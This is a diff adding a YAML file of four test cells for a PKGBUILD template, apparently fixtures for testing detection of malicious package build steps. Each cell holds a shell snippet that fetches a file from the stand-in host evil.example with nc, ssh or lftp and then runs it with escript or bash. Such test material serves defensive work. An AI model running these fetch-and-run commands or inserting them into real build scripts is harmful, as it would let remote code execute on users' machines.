@@ -1,0 +1,22 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        escript f.erl
+  id: 007-nc-escript
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        escript f.erl
+  id: 009-ssh-cat-escript
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get stage.sh; bye"
+        escript stage.sh
+  id: 011-lftp-c-escript
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get s.sh; bye"
+        bash s.sh
+  id: 012-lftp-c-bash
